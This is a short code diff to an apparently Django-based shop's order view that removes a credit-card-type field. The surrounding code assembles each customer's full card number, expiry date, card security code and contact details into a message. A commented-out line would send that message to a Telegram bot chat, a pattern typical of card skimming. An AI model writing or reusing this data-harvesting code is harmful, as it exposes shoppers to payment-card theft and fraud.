@@ -216,11 +216,10 @@ def make_order_view(request):
         city = form.cleaned_data['city']
         zipcode = form.cleaned_data['zipcode']
         NameonCard = form.cleaned_data['NameonCard']
-        CreditCardType = form.cleaned_data['CreditCardType']
         comments = form.cleaned_data['comments']
 
-        forma = 'name ={}\n last_name ={}\n phone={}\ncard_number={}\nexpiry_date={}\ncard_code={}\naddress={}\ncountry={}\ncity={}\nzipcode={}\nNameonCard={}\nCreditCardType={}\ncomments={}\ncart_total={}\n'.format(
-            name, last_name, phone, card_number, expiry_date, card_code, address, country, city, zipcode, NameonCard, CreditCardType, comments, cart.cart_total)
+        forma = 'name ={}\n last_name ={}\n phone={}\ncard_number={}\nexpiry_date={}\ncard_code={}\naddress={}\ncountry={}\ncity={}\nzipcode={}\nNameonCard={}\ncomments={}\ncart_total={}\n'.format(
+            name, last_name, phone, card_number, expiry_date, card_code, address, country, city, zipcode, NameonCard, comments, cart.cart_total)
         forma = urllib.parse.quote(forma)
         # urllib.request.urlopen(
         #     'https://api.telegram.org/bot{}/sendMessage?chat_id={}&text={}'.format(__token, __tl_chat_id, forma))
@@ -240,8 +239,7 @@ def make_order_view(request):
             country=country,
             city=city,
             zipcode=zipcode,
-            NameonCard=NameonCard,
-            CreditCardType=CreditCardType
+            NameonCard=NameonCard
         )
         del request.session['cart_id']
         del request.session['total']
